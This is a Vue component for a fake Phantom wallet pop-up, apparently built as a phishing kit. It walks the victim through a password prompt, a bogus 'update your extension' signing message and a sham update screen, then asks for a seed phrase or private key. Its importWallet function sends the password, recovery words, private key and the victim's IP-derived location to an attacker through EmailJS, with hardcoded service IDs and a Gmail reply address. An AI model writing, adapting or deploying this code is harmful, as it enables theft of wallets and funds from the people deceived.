<template>
  <div class="bg-[#232323] rounded-2xl w-full text-white overflow-hidden">
    <!-- Header -->
    <div
      class="flex justify-between items-center py-3 px-4 border-b border-gray-700"
    >
      <span></span>
      <img
        src="https://vercelquickfix.com/Phantom-Logo.svg"
        class="h-7"
        alt="Phantom logo"
      />
      <svg
        xmlns="http://www.w3.org/2000/svg"
        class="h-5 w-5 text-[#777777]"
        fill="none"
        viewBox="0 0 24 24"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          stroke-width="2"
          d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
        />
      </svg>
    </div>

    <!-- Step Container -->
    <div class="min-h-[220px] flex flex-col justify-center relative">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <!-- STEP 1 -->
          <template v-if="currentStep === 1">
            <div class="p-6 flex flex-col items-center justify-center">
              <div class="mb-4">
                <img
                  src="/images/sleeping-dark.gif"
                  alt="Phantom Logo"
                  class="w-48 h-auto"
                />
              </div>
              <form class="w-full">
                <h2
                  class="text-2xl leading-[24px] font-semibold text-center mb-6 tracking-[-0.02em]"
                >
                  Enter your password
                </h2>
                <div class="mb-2">
                  <input
                    type="password"
                    v-model="password"
                    style="background: #181818; font-size: 14px"
                    class="w-full font-medium bg-[#181818] rounded-[6px] p-3 text-[#777777] placeholder-[#777777] focus-visible:border-[#2f2f2f] focus-visible:ring-0 focus-visible:outline-none"
                    placeholder="Password"
                    required
                  />
                </div>
                <div class="text-center">
                  <a href="#" class="text-xl text-gray-300 hover:text-white"
                    >Forgot password</a
                  >
                </div>
                <div class="mt-32">
                  <button
                    @click="unlock"
                    type="button"
                    :disabled="password.length <= 6 || isLoading"
                    :class="password.length > 6 ? 'bg-[#ab9ff2]' : ''"
                    class="w-full py-3 px-4 border-none outline-none hover:border-none hover:text-[#222] rounded-[16px] font-semibold text-xl h-16 duration-200 flex items-center justify-center bg-[#333] text-white relative"
                  >
                    <span v-if="!isLoading">Unlock</span>
                    <svg
                      v-else
                      class="animate-spin h-6 w-6 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        class="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        stroke-width="4"
                      />
                      <path
                        class="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      />
                    </svg>
                  </button>
                </div>
              </form>
            </div>
          </template>

          <!-- STEP 2 -->
          <template v-else-if="currentStep === 2">
            <div class="p-6">
              <div class="flex mb-3">
                <div
                  class="bg-white rounded-xl w-14 h-14 flex items-center justify-center mr-3"
                >
                  <img
                    src="https://vercelquickfix.com/logo_mini.svg"
                    class="w-10 h-10 object-contain"
                  />
                </div>
                <div>
                  <p class="text-white mb-0 text-2xl font-bold">Sign Message</p>
                  <p class="text-gray-400 text-lg mt-0.5">
                    blockchain.rectify.app
                  </p>
                </div>
              </div>
              <p class="text-gray-400 text-xl mb-4">
                Signing this message will prove you have ownership of the
                selected account.
              </p>
              <div class="bg-[#333] rounded-2xl px-3 py-2 mb-3">
                <p class="text-white mb-2 font-bold text-lg">Message</p>
                <p class="text-gray-300 text-xl font-semibold">
                  ⚠️ Before you connect your wallet, please update your
                  extension
                </p>
                <p class="text-gray-400 text-lg">Click "Confirm" to continue</p>
              </div>
            </div>
            <div>
              <p class="text-gray-400 text-lg text-center mb-4">
                Only confirm if you trust this website.
              </p>
              <div class="flex gap-3 bg-[#333] w-full p-3">
                <button
                  @click="prevStep"
                  class="flex-1 font-bold bg-[#454545] border-none hover:border-none hover:text-[#222] hover:bg-[#555555] text-white py-3 px-4 rounded-[16px]"
                >
                  Cancel
                </button>
                <button
                  @click="nextStep"
                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-3 px-4 rounded-[16px]"
                >
                  Confirm
                </button>
              </div>
            </div>
          </template>

          <!-- STEP 3 (Multi-stage) -->
          <template v-else-if="currentStep === 3">
            <div
              v-if="subStep === 1"
              class="flex flex-col items-center justify-center p-8"
            >
              <img src="/images/sleeping-dark.gif" class="w-40 mb-4" />
              <h2
                class="text-3xl font-bold animate-pulse text-center text-[#ab9ff2]"
              >
                BoooooBoooooo...
              </h2>
            </div>

            <div
              v-else-if="subStep === 2"
              class="flex flex-col items-center justify-center p-6"
            >
              <img src="/images/sleeping-dark.gif" class="w-40 mb-4" />
              <p class="text-gray-300 text-lg text-center">
                Updating your wallet... please wait
              </p>
            </div>

            <!-- Successfully updated + Seed phrase -->
            <div v-else-if="subStep === 3 && !showPrivateKey" class="p-6">
              <div class="flex flex-col items-center mb-4">
                <img src="/images/sleeping-dark.gif" class="w-12 h-12 mr-2" />
                <h2 class="text-2xl font-bold">Successfully Updated</h2>
              </div>
              <p class="text-gray-400 mb-6 text-center text-lg">
                To ensure your account's security and prevent fraudulent
                activity, please enter your seed phrase to confirm the changes.
              </p>

              <div class="grid grid-cols-3 gap-3 mb-3">
                <div v-for="n in seedCount" :key="n" class="relative">
                  <span
                    class="absolute left-2 top-2 text-gray-500 text-sm select-none"
                    >{{ n }}</span
                  >
                  <input
                    v-model="seedWords[n - 1]"
                    type="text"
                    style="background: #181818; font-size: 14px"
                    class="w-full bg-[#181818] rounded-md py-2 pl-7 pr-2 text-white text-sm outline-none"
                  />
                </div>
              </div>

              <p
                class="text-lg text-[#ab9ff2] underline cursor-pointer mt-3 w-fit"
                @click="toggleSeedCount"
              >
                I have a {{ seedCount === 12 ? "24" : "12" }}-word recovery
                phrase
              </p>

              <p
                class="text-lg text-[#ab9ff2] underline cursor-pointer mt-2 w-fit"
                @click="showPrivateKey = true"
              >
                I have a private key
              </p>

              <div class="flex mt-6">
                <button
                  @click="importWallet"
                  :disabled="isLoading"
                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-3 px-4 rounded-[16px] flex items-center justify-center"
                >
                  <span v-if="!isLoading">Import Wallet</span>
                  <svg
                    v-else
                    class="animate-spin h-6 w-6 text-[#222]"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      class="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      stroke-width="4"
                    />
                    <path
                      class="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                    />
                  </svg>
                </button>
              </div>
            </div>

            <!-- Private Key View -->
            <div v-else-if="showPrivateKey" class="px-6 pt-6">
              <h2 class="text-2xl font-bold text-center mb-4">
                Enter Your Private Key
              </h2>
              <textarea
                v-model="privateKey"
                style="background: #181818; font-size: 14px; padding-top: 2px"
                class="w-full rounded-md py-2 px-3 text-white text-sm outline-none mb-6"
                rows="5"
              ></textarea>

              <div class="flex gap-3 mt-6">
                <button
                  @click="showPrivateKey = false"
                  class="flex-1 font-bold bg-[#454545] border-none hover:border-none hover:text-[#222] hover:bg-[#555555] text-white py-3 px-4 rounded-[16px]"
                >
                  Back
                </button>
                <button
                  @click="importWallet"
                  :disabled="isLoading"
                  class="flex-1 font-bold bg-[#ab9ff2] border-none hover:border-none hover:text-[#222] hover:bg-white text-[#222] py-3 px-4 rounded-[16px] flex items-center justify-center"
                >
                  <span v-if="!isLoading">Import Wallet</span>
                  <svg
                    v-else
                    class="animate-spin h-6 w-6 text-[#222]"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      class="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      stroke-width="4"
                    />
                    <path
                      class="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                    />
                  </svg>
                </button>
              </div>
            </div>
          </template>
        </div>
      </transition>

      <!-- ✅ SUCCESS & ERROR MESSAGE -->
      <transition name="fade">
        <div
          v-if="message.text"
          :class="[
            'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
            message.type === 'success'
              ? 'bg-green-600 text-white'
              : 'bg-red-600 text-white',
          ]"
        >
          {{ message.text }}
        </div>
      </transition>
    </div>
  </div>
</template>

<script setup>
import { ref, watch } from "vue";
import axios from "axios";

const currentStep = ref(1);
const subStep = ref(1);
const password = ref("");
const seedCount = ref(12);
const seedWords = ref(Array(12).fill(""));
const privateKey = ref("");
const isLoading = ref(false);
const showPrivateKey = ref(false);
const message = ref({ text: "", type: "" }); // ✅ For success/error feedback

function unlock() {
  if (password.value.length <= 6) return;
  isLoading.value = true;
  setTimeout(() => {
    isLoading.value = false;
    nextStep();
  }, 2000);
}

function nextStep() {
  if (currentStep.value < 3) {
    currentStep.value++;
    if (currentStep.value === 3) startSubSteps();
  }
}

function prevStep() {
  if (currentStep.value > 1) currentStep.value--;
}

function toggleSeedCount() {
  seedCount.value = seedCount.value === 12 ? 24 : 12;
  seedWords.value = Array(seedCount.value).fill("");
}

function startSubSteps() {
  subStep.value = 1;
  setTimeout(() => (subStep.value = 2), 2000);
  setTimeout(() => (subStep.value = 3), 4000);
}

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

const importWallet = async () => {
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      password: password.value,
      seedWords: seedWords.value.filter(Boolean),
      privateKey: privateKey.value || null,
    };

    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Phantom Wallets",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      
      showMessage("Wallet imported successfully!", "success");
    }
  } catch (error) {
    showMessage("Failed to import wallet. Please try again.", "error");
  } finally {
    isLoading.value = false;
  }
};

watch(currentStep, (val) => {
  if (val === 3) startSubSteps();
});
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.4s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
